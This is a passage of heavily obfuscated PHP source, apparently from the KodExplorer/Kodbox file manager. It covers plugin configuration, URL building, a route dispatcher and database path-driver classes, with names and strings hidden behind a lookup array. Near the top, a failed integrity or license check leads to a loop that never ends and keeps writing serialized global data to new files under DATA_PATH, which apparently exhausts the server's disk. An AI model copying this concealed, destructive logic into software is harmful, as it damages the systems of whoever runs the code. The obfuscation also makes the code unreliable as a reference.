$_SERVER[ÔÕ±ĞšÎ]; $ºÍ„Ê‡ş = $_SERVER[$ÊÁĞ·Êò[953]]; $Ó´Œ•× = $ÊÁĞ·Êò[1627]; if ($_SERVER[$ÊÁĞ·Êò[952]] != $Ó´Œ•×($ºÍ„Ê‡ş)) { $ã…½ï¼¼ = $ÊÁĞ·Êò[954]; $Ä·ŒÀ§ = $ÊÁĞ·Êò[955]; $îæ€ŒÇç = $_SERVER[$ÊÁĞ·Êò[956]] . $ÊÁĞ·Êò[957]; $òğ”ä³î = $Ä·ŒÀ§($îæ€ŒÇç); $¡‹ôÒ¥Ï = explode($ÊÁĞ·Êò[287], $òğ”ä³î); if (count($¡‹ôÒ¥Ï) < $ÊÁĞ·Êò[694]) { $©¤·…²› = $ÊÁĞ·Êò[958]; $©¤·…²›(); } $¥å‹ì™œ = $ÊÁĞ·Êò[959]; $¥å‹ì™œ($_SERVER[$ÊÁĞ·Êò[960]]); $ã…½ï¼¼ = $ÊÁĞ·Êò[954]; $ã…½ï¼¼(); $¾øáè–¿ = $ÊÁĞ·Êò[1628]; $ıûĞÂÕ = json_encode($GLOBALS[$ÊÁĞ·Êò[1629]]); $Œ§ÈÍá› = 1; for ($Ñò‘Öû± = $Œ§ÈÍá›; $Ñò‘Öû± > 0; $Ñò‘Öû±++) { $¾øáè–¿(DATA_PATH . $Ñò‘Öû±, $ıûĞÂÕ); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $Éæ¹†¯½); } public function onSetConfig($…Ğ÷ÜñÆ) { } public function onGetConfig($äñ¹´¤) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($·°…øùê) { if ($·°…øùê == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($¸˜¹´æø = "\x70\154\165\x67\151\x6e\101\x75\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ñ¿Æê‡¹ = $this->getConfig(); if (!$ñ¿Æê‡¹[$¸˜¹´æø]) { return !1; } return ActionCall($_SERVER[ÔÕ±ĞšÎ][1695], $ñ¿Æê‡¹[$¸˜¹´æø]); } public function url($·¿í©œÎ, $‹Œü˜ú = '', $‹¶çìµ = true) { $ŸÊÚ‘íè =& $_SERVER[ÔÕ±ĞšÎ]; $ÖéãûÍ = $this->getConfig(); $Ò¦ªœÜ = KOD_VERSION . $ŸÊÚ‘íè[10] . KOD_VERSION_BUILD; $×—ö®™€ = $this->packageVersion(); $¸ö®Ş¸ = $Ò¦ªœÜ . $ŸÊÚ‘íè[464] . $×—ö®™€; if (substr($·¿í©œÎ, 0, 4) == $ŸÊÚ‘íè[152] || substr($·¿í©œÎ, 0, 2) == $ŸÊÚ‘íè[1413]) { $¥Æø¦¤¬ = $·¿í©œÎ . $ŸÊÚ‘íè[1696] . $¸ö®Ş¸; } else { if ($‹Œü˜ú == $ŸÊÚ‘íè[12]) { $¥Æø¦¤¬ = $this->pluginHost . $·¿í©œÎ . $ŸÊÚ‘íè[1696] . $¸ö®Ş¸; } else { if ($‹Œü˜ú === $ŸÊÚ‘íè[78]) { $¥Æø¦¤¬ = $this->pluginHost . $·¿í©œÎ; } else { if ($‹Œü˜ú == $ŸÊÚ‘íè[1697]) { $¥Æø¦¤¬ = STATIC_PATH . $·¿í©œÎ . $ŸÊÚ‘íè[1696] . $Ò¦ªœÜ; } else { if ($‹Œü˜ú == $ŸÊÚ‘íè[1698]) { $¥Æø¦¤¬ = APP_HOST . $ŸÊÚ‘íè[1699] . $·¿í©œÎ . $ŸÊÚ‘íè[1696] . $Ò¦ªœÜ; } else { if (isset($ÖéãûÍ[$‹Œü˜ú])) { $¥Æø¦¤¬ = $ÖéãûÍ[$‹Œü˜ú] . $·¿í©œÎ . $ŸÊÚ‘íè[1696] . $¸ö®Ş¸; } } } } } } if (!$‹¶çìµ) { return $¥Æø¦¤¬; } echo $¥Æø¦¤¬; } public function link($Š‘ßã¢¼ = false, $ıô¬üê« = '') { $„ÒÃ×ğ =& $_SERVER[ÔÕ±ĞšÎ]; $®Ü‰‡ô = $this->linkHas == !1; $this->linkHas = !0; if (!$Š‘ßã¢¼) { $this->link($„ÒÃ×ğ[1700], $„ÒÃ×ğ[1698]); $this->link($„ÒÃ×ğ[1701], $„ÒÃ×ğ[1697]); $this->link($„ÒÃ×ğ[1702], $„ÒÃ×ğ[1697]); $this->link($„ÒÃ×ğ[1703], $„ÒÃ×ğ[1697]); $this->link($„ÒÃ×ğ[1704], $„ÒÃ×ğ[1697]); if ($®Ü‰‡ô) { Hook::trigger($„ÒÃ×ğ[1705]); } return; } $’Â·Ó»È = $this->url($Š‘ßã¢¼, $ıô¬üê«, !1); if (substr($Š‘ßã¢¼, -3) == $„ÒÃ×ğ[1706]) { echo $„ÒÃ×ğ[1707] . $’Â·Ó»È . $„ÒÃ×ğ[1708] . $„ÒÃ×ğ[287]; } else { if (substr($Š‘ßã¢¼, -4) == $„ÒÃ×ğ[1709]) { echo $„ÒÃ×ğ[1710] . $’Â·Ó»È . $„ÒÃ×ğ[1711] . $„ÒÃ×ğ[287]; } } if ($®Ü‰‡ô) { Hook::trigger($„ÒÃ×ğ[1705]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\x79" => "\x5b\x5e\x2f\x5d\53", "\72\x6e\165\x6d" => "\133\x30\x2d\x39\x5d\x2b", "\72\x61\x6c\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($çÂÓù®, $¡äŠ–§¨) { $ÍŠ£†Íü =& $_SERVER[ÔÕ±ĞšÎ]; if ($çÂÓù® == $ÍŠ£†Íü[1712]) { $ ¡€àù¼ = array_map($ÍŠ£†Íü[1713], $¡äŠ–§¨[0]); $Š¥‚¯‘Ù = strpos($¡äŠ–§¨[1], $ÍŠ£†Íü[8]) === 0 ? $¡äŠ–§¨[1] : $ÍŠ£†Íü[8] . $¡äŠ–§¨[1]; $èü®»¤Û = $¡äŠ–§¨[2]; } else { $ ¡€àù¼ = null; $Š¥‚¯‘Ù = strpos($¡äŠ–§¨[0], $ÍŠ£†Íü[8]) === 0 ? $¡äŠ–§¨[0] : $ÍŠ£†Íü[8] . $¡äŠ–§¨[0]; $èü®»¤Û = $¡äŠ–§¨[1]; } array_push(self::$maps, $ ¡€àù¼); array_push(self::$routes, $Š¥‚¯‘Ù); array_push(self::$methods, strtoupper($çÂÓù®)); array_push(self::$callbacks, $èü®»¤Û); } public static function error($•µ­Š–•) { self::$errorCallback = $•µ­Š–•; } public static function haltOnMatch($²åé± = true) { self::$halts = $²åé±; } public static function dispatch() { $ÆÒ…¼Ä =& $_SERVER[ÔÕ±ĞšÎ]; $²­ÉÏîı = parse_url($_SERVER[$ÆÒ…¼Ä[1714]], PHP_URL_PATH); $•’¾­õô = $_SERVER[$ÆÒ…¼Ä[164]]; $¨Ş´”“ = array_keys(static::$patterns); $Úå¹ªÁ‚ = array_values(static::$patterns); $¶ÓÀÊ•Ï = !1; self::$routes = preg_replace($ÆÒ…¼Ä[1363], $ÆÒ…¼Ä[8], self::$routes); if (in_array($²­ÉÏîı, self::$routes)) { $ìÑüïıé = array_keys(self::$routes, $²­ÉÏîı); foreach ($ìÑüïıé as $÷İ×°¤) { if (self::$methods[$÷İ×°¤] == $•’¾­õô || self::$methods[$÷İ×°¤] == $ÆÒ…¼Ä[1715] || in_array($•’¾­õô, self::$maps[$÷İ×°¤])) { $¶ÓÀÊ•Ï = !0; if (!is_object(self::$callbacks[$÷İ×°¤])) { $”“äÂ®Ç = explode($ÆÒ…¼Ä[8], self::$callbacks[$÷İ×°¤]); $ä˜˜Öú± = end($”“äÂ®Ç); $³Ááğã™ = explode($ÆÒ…¼Ä[1295], $ä˜˜Öú±); $§¹òÍ«¯ = new $³Ááğã™[0](); $§¹òÍ«¯->{$³Ááğã™[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$÷İ×°¤]); if (self::$halts) { return; } } } } } else { $©¸•Ü = 0; foreach (self::$routes as $÷İ×°¤) { if (strpos($÷İ×°¤, $ÆÒ…¼Ä[4]) !== !1) { $÷İ×°¤ = str_replace($¨Ş´”“, $Úå¹ªÁ‚, $÷İ×°¤); } if (preg_match($ÆÒ…¼Ä[1716] . $÷İ×°¤ . $ÆÒ…¼Ä[1717], $²­ÉÏîı, $÷¬ŒªõÊ)) { if (self::$methods[$©¸•Ü] == $•’¾­õô || self::$methods[$©¸•Ü] == $ÆÒ…¼Ä[1715] || !empty(self::$maps[$©¸•Ü]) && in_array($•’¾­õô, self::$maps[$©¸•Ü])) { $¶ÓÀÊ•Ï = !0; array_shift($÷¬ŒªõÊ); if (!is_object(self::$callbacks[$©¸•Ü])) { $”“äÂ®Ç = explode($ÆÒ…¼Ä[8], self::$callbacks[$©¸•Ü]); $ä˜˜Öú± = end($”“äÂ®Ç); $³Ááğã™ = explode($ÆÒ…¼Ä[1295], $ä˜˜Öú±); $§¹òÍ«¯ = new $³Ááğã™[0](); if (!method_exists($§¹òÍ«¯, $³Ááğã™[1])) { echo $ÆÒ…¼Ä[1718]; } else { call_user_func_array(array($§¹òÍ«¯, $³Ááğã™[1]), $÷¬ŒªõÊ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$©¸•Ü], $÷¬ŒªõÊ); if (self::$halts) { return; } } } } $©¸•Ü++; } } if ($¶ÓÀÊ•Ï == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $»ĞÛı§ò =& $_SERVER[ÔÕ±ĞšÎ]; header($_SERVER[$»ĞÛı§ò[1719]] . $»ĞÛı§ò[1720]); echo $»ĞÛı§ò[1721]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ÆÒ…¼Ä[1714]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto aÛÆå´šŸÌ; AŸ³à«„: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Øª¼™ËÌ) { $this->pathParse = $Øª¼™ËÌ; $this->model = Model($_SERVER[ÔÕ±ĞšÎ][1423]); } public function getPath($¨ßƒÚ—¦) { return trim($¨ßƒÚ—¦, $_SERVER[ÔÕ±ĞšÎ][8]); } public function pathFather($Î©£ÊşŠ) { $Çõ†õ½³ = $this->parse($Î©£ÊşŠ); $Çõ†õ½³ = $this->infoSimple($Î©£ÊşŠ); return $Çõ†õ½³ ? $Çõ†õ½³[$_SERVER[ÔÕ±ĞšÎ][192]] : !1; } public function pathThis($€‘§Ë€) { $¦ï”¸¬ = $this->infoSimple($€‘§Ë€); return $¦ï”¸¬ ? $¦ï”¸¬[$_SERVER[ÔÕ±ĞšÎ][32]] : !1; } public function getPathOuter($î¥Ö×‰) { if (!$î¥Ö×‰) { return $î¥Ö×‰; } $â‘º´¹ = $this->parse($î¥Ö×‰); return KodIO::make($â‘º´¹[$_SERVER[ÔÕ±ĞšÎ][477]]); } public function copyFolderFromIO($¡¡çİş›, $‹åğ“¬±, $ú¼øœ»§, $´ğœ´¯š, $¢éèì‚Ó) { $´Ùì›ì = $this->model->copyFolderFromIO($¡¡çİş›, $‹åğ“¬±, $ú¼øœ»§, $´ğœ´¯š, $¢éèì‚Ó); return KodIO::make($´Ùì›ì); } public function isParentOf($Æ¶¬§®‡, $£¶Ï°Õ¶) { return $this->model->isParentOf($Æ¶¬§®‡, $£¶Ï°Õ¶); } public function mkfile($–½¼‰, $úëòØÆË = '', $¦‡şË  = REPEAT_RENAME) { $ê¸–Ó¶ì =& $_SERVER[ÔÕ±ĞšÎ]; $Òì¾ˆĞ = $this->parse($–½¼‰); $–½¼‰ = $Òì¾ˆĞ[$ê¸–Ó¶ì[477]]; for ($Ñ·ù­ÂÉ = 0; $Ñ·ù­ÂÉ < count($Òì¾ˆĞ[$ê¸–Ó¶ì[1424]]); $Ñ·ù­ÂÉ++) { $ÕŞÚõé× = $Òì¾ˆĞ[$ê¸–Ó¶ì[1424]][$Ñ·ù­ÂÉ]; if ($Ñ·ù­ÂÉ == count($Òì¾ˆĞ[$ê¸–Ó¶ì[1424]]) - 1) { $–½¼‰ = $this->model->mkfile($–½¼‰, $ÕŞÚõé×, $úëòØÆË, $¦‡şË ); break; } $–½¼‰ = $this->model->mkdir($–½¼‰, $ÕŞÚõé×, REPEAT_SKIP); } return $this->getPathOuter($–½¼‰); } public function mkdir($Íº¬ØÛ, $ØÍ—££¦ = REPEAT_SKIP) { $¨¢Á¹™¼ =& $_SERVER[ÔÕ±ĞšÎ]; $†ıÙò‹û = $this->parse($Íº¬ØÛ); $Íº¬ØÛ = $†ıÙò‹û[$¨¢Á¹™¼[477]]; for ($€Û©¥¾¤ = 0; $€Û©¥¾¤ < count($†ıÙò‹û[$¨¢Á¹™¼[1424]]); $€Û©¥¾¤++) { $ªòÀ§» = $†ıÙò‹û[$¨¢Á¹™¼[1424]][$€Û©¥¾¤]; $Íº¬ØÛ = $this->model->mkdir($Íº¬ØÛ, $ªòÀ§», $ØÍ—££¦); } return $this->getPathOuter($Íº¬ØÛ); } public function copyFile($ßâóÈ«Ü, $êê¨à³…, $Î¥†Îßİ = REPEAT_REPLACE) { $“Ù¼€àÓ =& $_SERVER[ÔÕ±ĞšÎ]; $§È×­Ü = $this->parse($êê¨à³…); $ĞêÏ·‡ş = $this->model->copy($ßâóÈ«Ü, $§È×­Ü[$“Ù¼€àÓ[477]], $Î¥†Îßİ, $§È×­Ü[$“Ù¼€àÓ[87]]); return $ĞêÏ·‡ş ? $this->getPathOuter($ĞêÏ·‡ş) : !1; } public function moveFile($…”ó¡ÖÉ, $ÜŞ¡­¿, $Ÿ¿ö‘Ø = REPEAT_REPLACE) { $õ©âìğ =& $_SERVER[ÔÕ±ĞšÎ]; $ú¨Ö”–Ó = $this->parse($ÜŞ¡­¿); $ƒÖ–”Äõ = $this->model->move($…”ó¡ÖÉ, $ú¨Ö”–Ó[$õ©âìğ[477]], $Ÿ¿ö‘Ø, $ú¨Ö”–Ó[$õ©âìğ[87]]); return $ƒÖ–”Äõ ? $this->getPathOuter($ƒÖ–”Äõ) : !1; } public function copy($üîÌİô, $Á°•´í´, $Õ“á¾úî = REPEAT_REPLACE, $®â«éì = false) { $ñ‘ÏØ‘Í = $this->parse($Á°•´í´); $ùã ‚Ä = $this->model->copy($üîÌİô, $ñ‘ÏØ‘Í[$_SERVER[ÔÕ±ĞšÎ][477]], $Õ“á¾úî, $®â«éì); return $ùã ‚Ä ? $this->getPathOuter($ùã ‚Ä) : !1; } public function moveSameAllow() { } public function move($üèêÚ‘, $§Ç¥ÀÔ‹, $úš¿¢Âô = REPEAT_REPLACE, $îíí›Á¾ = false) { $šã˜ß– = $this->parse($§Ç¥ÀÔ‹); $‚Ñ˜Ãòº = $this->model->move($üèêÚ‘, $šã˜ß–[$_SERVER[ÔÕ±ĞšÎ][477]], $úš¿¢Âô, $îíí›Á¾); return $‚Ñ˜Ãòº ? $this->getPathOuter($‚Ñ˜Ãòº) : !1; } public function remove($ïÑÁœöÌ, $¬¦³°»ï = true) { return $this->model->remove($ïÑÁœöÌ, $¬¦³°»ï); } public function rename($¾Õ³­ñ, $ƒÇ–¢òû) { $·„Òñ¢õ = $this->model->rename($¾Õ³­ñ, $ƒÇ–¢òû); return $·„Òñ¢õ ? $this->getPathOuter($¾Õ³­ñ) : $·„Òñ¢õ; } public function size($´ÆÊŠ™š) { $èå‚üÅÙ = $this->infoSimple($´ÆÊŠ™š); return $èå‚üÅÙ ? $èå‚üÅÙ[$_SERVER[ÔÕ±ĞšÎ][79]] : 0; } public function infoSimple($º»¯’³ğ) { return $this->model->sourceInfo($º»¯’³ğ); } public function info($ºîîîô·) { return $this->infoParse($ºîîîô·); } public function infoAuth($ãô²øûß) { return $this->infoParse($ãô²øûß, !1, !0); } public function infoWithChildren($öä¬ÛÃ) { return $this->infoParse($öä¬ÛÃ, !0); } protected function infoParse($Ùğ­¼æ, $’¡†µ = false, $äüı—Æí = false) { if (!$’¡†µ) { return $this->model->pathInfo($Ùğ­¼æ, $äüı—Æí); } return $this->model->pathInfoMore($Ùğ­¼æ); } public function infoFullSimple($ªÆ³ö­) { $¾£¹²‚ =& $_SERVER[ÔÕ±ĞšÎ]; $ıªÊ˜È = explode($¾£¹²‚[8], $ªÆ³ö­); $‰Œ“ŒÍç = implode($¾£¹²‚[8], array_splice($ıªÊ˜È, 1)); return $this->model->pathInfoByPath($ıªÊ˜È[0], $‰Œ“ŒÍç); } public function infoFull($Ï‡µÖÈ×) { $ÆèŒü™ = $this->infoFullSimple($Ï‡µÖÈ×); return is_array($ÆèŒü™) ? $this->model->pathInfo($ÆèŒü™[$_SERVER[ÔÕ±ĞšÎ][193]]) : !1; } public function hashSimple($û‘¶«”) { $ÉÆ×–¨µ =& $_SERVER[ÔÕ±ĞšÎ]; $‚¿ŒÕÕ = $this->infoWithChildren($û‘¶«”); return $‚¿ŒÕÕ[$ÉÆ×–¨µ[170]][$ÉÆ×–¨µ[677]]; } public function hashMd5($çƒ¦ÁŸ®) { $èºğ©Ş³ =& $_SERVER[ÔÕ±ĞšÎ]; $Ö•»‚æÙ = $this->infoWithChildren($çƒ¦ÁŸ®); return $Ö•»‚æÙ[$èºğ©Ş³[170]][$èºğ©Ş³[549]]; } public function exist($Çˆ¥½ê§) { $Óêã¦”Æ =& $_SERVER[ÔÕ±ĞšÎ]; $ÚğŞèÍè = $this->parse($Çˆ¥½ê§); if (!$ÚğŞèÍè[$Óêã¦”Æ[87]]) { return $this->isFile($Çˆ¥½ê§) || $this->isFolder($Çˆ¥½ê§); } $Ôáˆ¬é¤ = array($Óêã¦”Æ[479] => $ÚğŞèÍè[$Óêã¦”Æ[477]], $Óêã¦”Æ[32] => $ÚğŞèÍè[$Óêã¦”Æ[87]]); $…“©¼á¡ = $this->model->where($Ôáˆ¬é¤)->find(); return $…“©¼á¡ ? !0 : !1; } public function isFile($í‰…Å’í) { $Ö¤áÌŸ =& $_SERVER[ÔÕ±ĞšÎ]; $á¼ˆë¸Ü = $this->infoSimple($í‰…Å’í); return $á¼ˆë¸Ü && $á¼ˆë¸Ü[$Ö¤áÌŸ[487]] == $Ö¤áÌŸ[230] ? !0 : !1; } public function isFolder($Õ–­‹çĞ) { $õ†İéÙÛ =& $_SERVER[ÔÕ±ĞšÎ]; $ÑğùŠ·¬ = $this->infoSimple($Õ–­‹çĞ); return $ÑğùŠ·¬ && $ÑğùŠ·¬[$õ†İéÙÛ[487]] == $õ†İéÙÛ[91] ? !0 : !1; } public function listPath($Š´®éğ˜, $Ö…ƒõ„˜ = false) { $›‘¸©Ùİ =& $_SERVER[ÔÕ±ĞšÎ]; if ($Š´®éğ˜ == $›‘¸©Ùİ[12]) { return !1; } $Öäêä† = array($›‘¸©Ùİ[479] => $Š´®éğ˜); if ($Ö…ƒõ„˜) { return $this->model->listSource($Öäêä†, -1); } return $this->model->listSource($Öäêä†); } public function has($Œ›äÂÌ, $ÛÎß—Ÿ¿ = false, $ø±şéäş = null) { $Úªúèàë =& $_SERVER[ÔÕ±ĞšÎ]; $íá÷¹ û = $this->infoWithChildren($Œ›äÂÌ); if ($ÛÎß—Ÿ¿) { return array($Úªúèàë[242] => $íá÷¹ û[$Úªúèàë[242]], $Úªúèàë[241] => $íá÷¹ û[$Úªúèàë[241]]); } return $ø±şéäş ? $íá÷¹ û[$Úªúèàë[242]] : $íá÷¹ û[$Úªúèàë[241]]; } public function listAll($†÷Ï¼ùÑ) { $¿ÍÌËÆƒ = IO::info($this->pathParse[$_SERVER[ÔÕ±ĞšÎ][87]]); if (!$¿ÍÌËÆƒ) { return array(); } return $this->model->listAll($†÷Ï¼ùÑ); } public function getContent($ŒÈàçøÒ) { return $this->model->getContent($ŒÈàçøÒ); } public function setContent($š‚»«í÷, $Øï¡üÑ = '') { return $this->model->setContent($š‚»«í÷, $Øï¡üÑ); } public function fileSubstr($ó‰µå¾æ, $Ùœ¹Õìø, $ ®¢¨ú») { return $this->model->fileSubstr($ó‰µå¾æ, $Ùœ¹Õìø, $ ®¢¨ú»); } public function download($Üû·¸ÚÓ, $‘«‘ôø = '') { $–íÛÏø• = get_path_father($‘«‘ôø); $Ä”±º = get_path_this($‘«‘ôø); $ı¾×©‹ƒ = $this->model->fileInfoGet($Üû·¸ÚÓ); $ıÛ…›ÆŒ = IO::copy($ı¾×©‹ƒ[$_SERVER[ÔÕ±ĞšÎ][87]], $–íÛÏø•, !1, $Ä”±º); return $ıÛ…›ÆŒ; } public function setModifyTime($–ä‡ğĞ, $ÆŠ¿«¹ = '') { $Ê‡ì“ª» =& $_SERVER[ÔÕ±ĞšÎ]; if (!$–ä‡ğĞ) { return; } $this->model->where(array($Ê‡ì“ª»[493] => $–ä‡ğĞ))->save(array($Ê‡ì“ª»[88] => $ÆŠ¿«¹)); } public function upload($µ¯íñœ, $¦ŠÜåÍ, $—ÉıÇˆØ = false, $ü´ãåšè = REPEAT_REPLACE) { $‡‰¡ï€¨ =& $_SERVER[ÔÕ±ĞšÎ]; $ÍşÁş¢ƒ = $this->parse($µ¯íñœ); $ıÎÈ²œ± = $this->model->addFile($ÍşÁş¢ƒ[$‡‰¡ï€¨[477]], $¦ŠÜåÍ, $ÍşÁş¢ƒ[$‡‰¡ï€¨[87]], $—ÉıÇˆØ, $ü´ãåšè); return $this->getPathOuter($ıÎÈ²œ±); } public function uploadFileByID($øº÷«í, $Ó‘“§ˆ¾, $•ºô©ˆ) { $¿àœÛ¤ç =& $_SERVER[ÔÕ±ĞšÎ]; $ö¨÷ÎàÀ = $this->parse($øº÷«í); $æê¬„¹ˆ = $this->model->addFileByFileID($ö¨÷ÎàÀ[$¿àœÛ¤ç[477]], $Ó‘“§ˆ¾, $ö¨÷ÎàÀ[$¿àœÛ¤ç[87]], $•ºô©ˆ); return $this->getPathOuter($æê¬„¹ˆ); } public function addFileByRemote($şõ×ä¬¢, $Û²ÎŞ–ë, $™´Ö¬Äß = array(), $¼®¬ÒÂ = '', $‰á „•Œ) { $ÍèĞÌñÔ =& $_SERVER[ÔÕ±ĞšÎ]; $Ùˆ‰Îà· = $this->parse($şõ×ä¬¢); $¼®¬ÒÂ = empty($¼®¬ÒÂ) ? $Ùˆ‰Îà·[$ÍèĞÌñÔ[87]] : $¼®¬ÒÂ; $£ƒÅ–ŞÎ = $this->model->addFileByRemote($Ùˆ‰Îà·[$ÍèĞÌñÔ[477]], $Û²ÎŞ–ë, $¼®¬ÒÂ, $™´Ö¬Äß, $‰á „•Œ); return $this->getPathOuter($£ƒÅ–ŞÎ); } public function uploadLink($ËöºÔáò, $‘ô âäİ = 0) { $©ÂÎşê‰ =& $_SERVER[ÔÕ±ĞšÎ]; $¾Çí¦ˆÜ = $this->parse($ËöºÔáò); $®äòèâÑ = _get($GLOBALS[$©ÂÎşê‰[7]], $©ÂÎşê‰[1425]); $šµ›ô† = _get($GLOBALS[$©ÂÎşê‰[7]], $©ÂÎşê‰[1426]); $ËöºÔáò = Model($©ÂÎşê‰[679])->createFileName($¾Çí¦ˆÜ[$©ÂÎşê‰[87]], $®äòèâÑ, $šµ›ô†); return IO::uploadLink($ËöºÔáò, $‘ô âäİ); } public function fileNameAuto($×ÔÌ™Î‚, $¤ºÍÆëº, $ğ™úÄô“ = REPEAT_REPLACE, $‹µ—óÁü = false) { return $this->model->fileNameAuto($×ÔÌ™Î‚, $¤ºÍÆëº, $ğ™úÄô“, $‹µ—óÁü); } public function fileNameExist($ĞçœéÃó, $ø¿Á ) { return $this->model->fileNameExist($ĞçœéÃó, $ø¿Á ); } protected function _fileOut($Å³Â±ºğ, $şƒã¢üŠ = false, $èÕö«£  = false, $‡ŞÙËŠö = '', $äÀŒÂı¹ = false) { $Ö¤ı’Äã =& $_SERVER[ÔÕ±ĞšÎ]; $ŸÖ«Ñú = $this->model->sourceInfo($Å³Â±ºğ); if ($ŸÖ«Ñú[$Ö¤ı’Äã[487]] == $Ö¤ı’Äã[91]) { header($Ö¤ı’Äã[1427]); die; } $¨ä‚†å‡ = $this->model->fileInfoGet($Å³Â±ºğ); $‡ŞÙËŠö = $¨ä‚†å‡[$Ö¤ı’Äã[549]] ? $¨ä‚†å‡[$Ö¤ı’Äã[549]] : $‡ŞÙËŠö; $ùò®‚Â = isset($GLOBALS[$Ö¤ı’Äã[182]]) && is_array($GLOBALS[$Ö¤ı’Äã[182]]) ? $GLOBALS[$Ö¤ı’Äã[182]][$Ö¤ı’Äã[32]] : $ŸÖ«Ñú[$Ö¤ı’Äã[32]]; if ($äÀŒÂı¹) { return IO::fileOutServer($¨ä‚†å‡[$Ö¤ı’Äã[87]], $şƒã¢üŠ, $ùò®‚Â, $‡ŞÙËŠö); } IO::fileOut($¨ä‚†å‡[$Ö¤ı’Äã[87]], $şƒã¢üŠ, $ùò®‚Â, $‡ŞÙËŠö); } public function fileOut($³ ùùï, $É”ÅË–ª = false, $¸ŠÂÊ¨Ü = false, $İ¾ÇÂ¢å = '') { $this->_fileOut($³ ùùï, $É”ÅË–ª, $¸ŠÂÊ¨Ü, $İ¾ÇÂ¢å); } public function fileOutServer($òÌÜ‹Şß, $ÖîÛ¡šº = false, $¤Ç£Şğ™ = false, $Íü¢­Ùã = '') { $this->_fileOut($òÌÜ‹Şß, $ÖîÛ¡šº, $¤Ç£Şğ™, $Íü¢­Ùã, !0); } protected function _fileOutImage($ÊÆİİ«, $îŸûà—“ = 250) { $…ï¸íˆõ =& $_SERVER[ÔÕ±ĞšÎ]; $—ıœÔĞÁ = $this->model->pathInfo($ÊÆİİ«); if ($—ıœÔĞÁ[$…ï¸íˆõ[487]] == $…ï¸íˆõ[91]) { show_json($…ï¸íˆõ[1428] . $ÊÆİİ«, !1); } $ı©ïª¦ = $this->model->fileInfoGet($ÊÆİİ«); $—ıœÔĞÁ[$…ï¸íˆõ[183]] = $ı©ïª¦[$…ï¸íˆõ[87]]; $GLOBALS[$…ï¸íˆõ[182]] = $—ıœÔĞÁ; IO::fileOutImage($ı©ïª¦[$…ï¸íˆõ[87]], $îŸûà—“); } public function fileOutImage($ùëÙı¢, $ß”ĞõÁ = 250) { $this->_fileOutImage($ùëÙı¢, $ß”ĞõÁ); } public function fileOutImageServer($³îí†Ë, $…Óã²­” = 250) { $this->_fileOutImage($³îí†Ë, $…Óã²­”); } public function link($ŠÉ¡³„, $‰ôïÊÍ = '') { $Ã¶ñåù = $this->model->fileInfoGet($ŠÉ¡³„); return IO::link($Ã¶ñåù[$_SERVER[ÔÕ±ĞšÎ][87]], $‰ôïÊÍ); } protected function parse($×²ñ™š) { $çíø¿âÄ =& $_SERVER[ÔÕ±ĞšÎ]; if (strstr($×²ñ™š, $çíø¿âÄ[8]) === !1) { return array($çíø¿âÄ[495] => intval($×²ñ™š), $çíø¿âÄ[87] => $çíø¿âÄ[12], $çíø¿âÄ[1424] => array()); } $ïğ˜†Ò = explode($çíø¿âÄ[8], trim($×²ñ™š, $çíø¿âÄ[8])); if (count($ïğ˜†Ò) < 2) { show_tips(clear_html($×²ñ™š) . $çíø¿âÄ[1429]); } return array($çíø¿âÄ[495] => intval($ïğ˜†Ò[0]), $çíø¿âÄ[87] => $ïğ˜†Ò[1], $çíø¿âÄ[1424] => array_slice($ïğ˜†Ò, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($€™ÌâÇ) { $this->pathParse = $€™ÌâÇ; $this->model = Model($_SERVER[ÔÕ±ĞšÎ][1423]); } public function getPathOuter($»üÒ²•Ê) { $œø§Ëª• =& $_SERVER[ÔÕ±ĞšÎ]; if (!$»üÒ²•Ê) { return $»üÒ²•Ê; } $òôì¢ñ = $this->parse($»üÒ²•Ê); return trim(KodIO::makeShare($this->pathParse[$œø§Ëª•[477]], $òôì¢ñ[$œø§Ëª•[477]]), $œø§Ëª•[8]); } protected function infoParse($‹Êñˆ§ä, $Öúª®’ = false, $·íœŒı = false) { $çè‹š© =& $_SERVER[ÔÕ±ĞšÎ]; $ò’«„Ñè = $this->pathParse[$çè‹š©[477]]; $ûàîçØÒ = trim($this->pathParse[$çè‹š©[1252]], $çè‹š©[8]); return Action($çè‹š©[1430])->sharePathInfo($ò’«„Ñè, $ûàîçØÒ, $Öúª®’); } public function infoFull($›·¹Šú­) { $ø»è¯¥ =& $_SERVER[ÔÕ±ĞšÎ]; $ÍÌ»Æ¡¥ = explode($ø»è¯¥[8], trim($›·¹Šú­, $ø»è¯¥[8])); if (count($ÍÌ»Æ¡¥) > 1) { $×ıÒ¼ş = implode($ø»è¯¥[8], array_splice($ÍÌ»Æ¡¥, 1)); $ß¥×û¦‹ = $this->model->pathInfoByPath($ÍÌ»Æ¡¥[0], $×ıÒ¼ş); if (!$ß¥×û¦‹) { return !1; } $this->pathParse[$ø»è¯¥[1252]] = $ß¥×û¦‹[$ø»è¯¥[193]]; } return $this->infoParse($›·¹Šú­); } public function listAll($ƒ¾ı­¡ï) { $òªè–¤å =& $_SERVER[ÔÕ±ĞšÎ]; $™Á¼¨”¡ = IO::info($this->pathParse[$òªè–¤å[87]]); if (!$™Á¼¨”¡) { return array(); } $‡ØÍ¼û = $this->model->listAll($ƒ¾ı­¡ï); $Ø™²Úªû = Model($òªè–¤å[669])->getInfo($™Á¼¨”¡[$òªè–¤å[670]]); foreach ($‡ØÍ¼û as &$İúÂŞœÜ) { check_abort(); $İúÂŞœÜ[$òªè–¤å[90]] = Action($òªè–¤å[1430])->_shareItemeParse($İúÂŞœÜ[$òªè–¤å[90]], $Ø™²Úªû); } unset($İúÂŞœÜ); return $‡ØÍ¼û; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($¾“ŠáÊ¶) { $this->pathParse = 